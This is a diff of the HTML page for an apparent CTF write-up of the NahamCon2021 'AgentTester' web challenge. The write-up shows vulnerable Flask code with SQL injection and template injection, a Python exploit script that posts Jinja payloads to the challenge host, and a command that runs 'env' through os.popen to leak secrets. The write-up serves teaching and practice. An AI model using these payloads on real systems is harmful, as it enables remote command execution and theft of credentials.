@@ -1,9 +1,14 @@
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title> NahamCon2021 CTF - AgentTester | #!/slash/note</title>
+  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-agenttester/'>
   <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
@@ -14,8 +19,8 @@ solution We&rsquo;re given an archive to download, agenttester.zip. This contain
 The challenge URL dropped us on a page where we need to login. So, create an account, login and land on the home page of the agent tester." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-agenttester/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-03-15T11:26:45&#43;02:00" />
-<meta property="article:modified_time" content="2021-03-15T11:26:45&#43;02:00" />
+<meta property="article:published_time" content="2021-03-15T11:26:45+02:00" />
+<meta property="article:modified_time" content="2021-03-15T11:26:45+02:00" />
 
 
   <meta name="twitter:card" content="summary"/>
@@ -26,8 +31,11 @@ The challenge URL dropped us on a page where we need to login. So, create an acc
 
   
   
+    
   
-  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
   
    <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
   
@@ -38,7 +46,7 @@ The challenge URL dropped us on a page where we need to login. So, create an acc
   
 
   
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
 
   
   
@@ -66,8 +74,8 @@ if (!doNotTrack) {
 
   <div id="header-post">
   <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
   <span id="menu" style="visibility: visible;">
     <span id="nav">
       <ul>
@@ -87,25 +95,25 @@ if (!doNotTrack) {
       <ul>
         
         <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-bad-blog/">
+          <a class="icon" href=" https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-bad-blog/" aria-label="Previous">
             <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
           </a>
         </li>
         
         
         <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-asserted/">
+          <a class="icon" href="https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-asserted/" aria-label="Next">
             <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
           </a>
         </li>
         
         <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
             <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
           </a>
         </li>
         <li>
-          <a class="icon" href="#">
+          <a class="icon" href="#" aria-label="Share">
             <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
           </a>
         </li>
@@ -125,57 +133,47 @@ if (!doNotTrack) {
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f" aria-label="Facebook">
       <i class="fab fa-facebook " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&text=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&text=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Twitter">
       <i class="fab fa-twitter " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Linkedin">
       <i class="fab fa-linkedin " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&is_video=false&description=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&is_video=false&description=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Pinterest">
       <i class="fab fa-pinterest " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20AgentTester&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f">
+    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20AgentTester&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f" aria-label="Email">
       <i class="fas fa-envelope " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Pocket">
       <i class="fab fa-get-pocket " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester" aria-label="reddit">
       <i class="fab fa-reddit " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
-      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
-      <i class="fab fa-digg " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&name=NahamCon2021%20CTF%20-%20AgentTester&description=category%20web%20-%20medium%0asolution%20We%26rsquo%3bre%20given%20an%20archive%20to%20download%2c%20agenttester.zip.%20This%20contained%20a%20Dockerfile%20and%20a%20python%20web%20application.%20The%20files%20in%20the%20archive%20had%20many%20secrets%20redacted%20which%20were%20set%20using%20environment%20variables.%20One%20specifically%20interesting%20one%20was%20CHALLENGE_FLAG%2c%20which%20we%20could%20assume%20was%20the%20target%20value%20to%20leak.%0aThe%20challenge%20URL%20dropped%20us%20on%20a%20page%20where%20we%20need%20to%20login.%20So%2c%20create%20an%20account%2c%20login%20and%20land%20on%20the%20home%20page%20of%20the%20agent%20tester.">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&name=NahamCon2021%20CTF%20-%20AgentTester&description=category%20web%20-%20medium%0asolution%20We%26rsquo%3bre%20given%20an%20archive%20to%20download%2c%20agenttester.zip.%20This%20contained%20a%20Dockerfile%20and%20a%20python%20web%20application.%20The%20files%20in%20the%20archive%20had%20many%20secrets%20redacted%20which%20were%20set%20using%20environment%20variables.%20One%20specifically%20interesting%20one%20was%20CHALLENGE_FLAG%2c%20which%20we%20could%20assume%20was%20the%20target%20value%20to%20leak.%0aThe%20challenge%20URL%20dropped%20us%20on%20a%20page%20where%20we%20need%20to%20login.%20So%2c%20create%20an%20account%2c%20login%20and%20land%20on%20the%20home%20page%20of%20the%20agent%20tester." aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&t=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&t=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Hacker News">
       <i class="fab fa-hacker-news " aria-hidden="true"></i>
     </a>
   </li>
@@ -201,38 +199,32 @@ if (!doNotTrack) {
       </h1>
       <div class="meta">
         
-        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <span itemprop="name">
-            
-              #!/slash/note
-            
-          </span>
-        </span>
-        
         <div class="postdate">
           
           <time datetime="2021-03-15 11:26:45 &#43;0200 SAST" itemprop="datePublished">2021-03-15</time>
           
         </div>
         
+        
+        
         <div class="article-category">
-          <i class="fas fa-archive"></i>
-          
-          
-          <a class="category-link" href="https://leonjza.github.io/categories/writeup">writeup</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/ctf">ctf</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/nahamcon">nahamcon</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/nahamcon2021">nahamcon2021</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/2021">2021</a>
-          
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/writeup">writeup</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/ctf">ctf</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/nahamcon">nahamcon</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/nahamcon2021">nahamcon2021</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/2021">2021</a>
+            
         </div>
         
         
@@ -257,11 +249,11 @@ if (!doNotTrack) {
 <figure><img src="https://leonjza.github.io/images/nahamcon/agent_tester_sql.png"/>
 </figure>
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">query = db.session.execute(
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">query = db.session.execute(
     <span style="color:#87ceeb">&#34;SELECT userAgent, url FROM uAgents WHERE userAgent = &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39;&#34;</span> % uAgent
 ).fetchone()
 </code></pre></div><p>The application also set the admin credentials from environment variables when configuring the web application. Using the SQL injection we found we could try and leak those.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">@app.before_first_request
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">@app.before_first_request
 <span style="color:#f00">def</span> <span style="color:#ff0">create_tables</span>():
     db.create_all()
 
@@ -275,22 +267,22 @@ if (!doNotTrack) {
         db.session.add(user)
         db.session.commit()
     <span style="color:#f00">except</span> Exception <span style="color:#f00">as</span> e:
-        <span style="color:#f00">print</span>(str(e), flush=True)
+        print(str(e), flush=<span style="color:#f00">True</span>)
 </code></pre></div><p>Thankfully Burp allows for repeating web socket requests, so crafting a payload to disclose the admin user&rsquo;s password is relatively easy.</p>
 <figure><img src="https://leonjza.github.io/images/nahamcon/agent_tester_admin_creds.png"/>
 </figure>
 
 <p>With admin creds, we can now browse to the <code>/debug</code> endpoint which was protected by the admin session (session id <code>1</code>).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">@app.route(<span style="color:#87ceeb">&#34;/debug&#34;</span>, methods=[<span style="color:#87ceeb">&#34;POST&#34;</span>])
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">@app.route(<span style="color:#87ceeb">&#34;/debug&#34;</span>, methods=[<span style="color:#87ceeb">&#34;POST&#34;</span>])
 <span style="color:#f00">def</span> <span style="color:#ff0">debug</span>():
-    sessionID = session.get(<span style="color:#87ceeb">&#34;id&#34;</span>, None)
+    sessionID = session.get(<span style="color:#87ceeb">&#34;id&#34;</span>, <span style="color:#f00">None</span>)
     <span style="color:#f00">if</span> sessionID == <span style="color:#f60">1</span>:
         code = request.form.get(<span style="color:#87ceeb">&#34;code&#34;</span>, <span style="color:#87ceeb">&#34;&lt;h1&gt;Safe Debug&lt;/h1&gt;&#34;</span>)
         <span style="color:#f00">return</span> render_template_string(code)
     <span style="color:#f00">else</span>:
         <span style="color:#f00">return</span> <span style="color:#87ceeb">&#34;Not allowed.&#34;</span>
 </code></pre></div><p>The vuln should be relatively obvious here. Jinja&rsquo;s <code>render_template_string()</code> is called if we provide a value to <code>code</code>. To exploit this template injection I wrote this script.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f00">import</span> requests
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f00">import</span> requests
 <span style="color:#f00">import</span> sys
 
 burp0_url = <span style="color:#87ceeb">&#34;http://challenge.nahamcon.com:31162/debug&#34;</span>
@@ -305,12 +297,12 @@ burp0_headers = {
         <span style="color:#87ceeb">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#87ceeb">&#34;1&#34;</span>
 }
 
-data = {<span style="color:#87ceeb">&#34;code&#34;</span>: f<span style="color:#87ceeb">&#34;{{{{ {sys.argv[1]} }}}}&#34;</span>}
+data = {<span style="color:#87ceeb">&#34;code&#34;</span>: <span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">{{{{</span><span style="color:#87ceeb"> </span><span style="color:#87ceeb">{</span>sys.argv[<span style="color:#f60">1</span>]<span style="color:#87ceeb">}</span><span style="color:#87ceeb"> </span><span style="color:#87ceeb">}}}}</span><span style="color:#87ceeb">&#34;</span>}
 
 r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data)
-<span style="color:#f00">print</span>(r.text)
+print(r.text)
 </code></pre></div><p>Calling it to run the <code>env</code> OS command revealed the flag.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 pwn.py <span style="color:#87ceeb">&#34;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;env&#39;).read()&#34;</span> | grep CHALLENGE
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 pwn.py <span style="color:#87ceeb">&#34;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;env&#39;).read()&#34;</span> | grep CHALLENGE
 <span style="color:#eedd82">CHALLENGE_FLAG</span>=flag{fb4a87cfa85cf8c5ab2effedb4ea7006}
 <span style="color:#eedd82">CHALLENGE_NAME</span>=AgentTester
 </code></pre></div>
@@ -383,57 +375,47 @@ r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f" aria-label="Facebook">
       <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&text=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&text=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Twitter">
       <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Linkedin">
       <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&is_video=false&description=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&is_video=false&description=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Pinterest">
       <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20AgentTester&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f">
+    <a class="icon" href="mailto:?subject=NahamCon2021%20CTF%20-%20AgentTester&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f" aria-label="Email">
       <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Pocket">
       <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester" aria-label="reddit">
       <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
-      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&title=NahamCon2021%20CTF%20-%20AgentTester">
-      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&name=NahamCon2021%20CTF%20-%20AgentTester&description=category%20web%20-%20medium%0asolution%20We%26rsquo%3bre%20given%20an%20archive%20to%20download%2c%20agenttester.zip.%20This%20contained%20a%20Dockerfile%20and%20a%20python%20web%20application.%20The%20files%20in%20the%20archive%20had%20many%20secrets%20redacted%20which%20were%20set%20using%20environment%20variables.%20One%20specifically%20interesting%20one%20was%20CHALLENGE_FLAG%2c%20which%20we%20could%20assume%20was%20the%20target%20value%20to%20leak.%0aThe%20challenge%20URL%20dropped%20us%20on%20a%20page%20where%20we%20need%20to%20login.%20So%2c%20create%20an%20account%2c%20login%20and%20land%20on%20the%20home%20page%20of%20the%20agent%20tester.">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&name=NahamCon2021%20CTF%20-%20AgentTester&description=category%20web%20-%20medium%0asolution%20We%26rsquo%3bre%20given%20an%20archive%20to%20download%2c%20agenttester.zip.%20This%20contained%20a%20Dockerfile%20and%20a%20python%20web%20application.%20The%20files%20in%20the%20archive%20had%20many%20secrets%20redacted%20which%20were%20set%20using%20environment%20variables.%20One%20specifically%20interesting%20one%20was%20CHALLENGE_FLAG%2c%20which%20we%20could%20assume%20was%20the%20target%20value%20to%20leak.%0aThe%20challenge%20URL%20dropped%20us%20on%20a%20page%20where%20we%20need%20to%20login.%20So%2c%20create%20an%20account%2c%20login%20and%20land%20on%20the%20home%20page%20of%20the%20agent%20tester." aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&t=NahamCon2021%20CTF%20-%20AgentTester">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f03%2f15%2fnahamcon2021-ctf-agenttester%2f&t=NahamCon2021%20CTF%20-%20AgentTester" aria-label="Hacker News">
       <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
     </a>
   </li>
@@ -443,13 +425,13 @@ r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=
 
     <div id="actions-footer">
       
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
           <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
           <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
           <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
           <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
@@ -485,6 +467,7 @@ r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=
 <link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
 <script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
 <script src=https://leonjza.github.io/js/main.js></script>
+<script src=https://leonjza.github.io/js/code-copy.js></script>
 
 
 
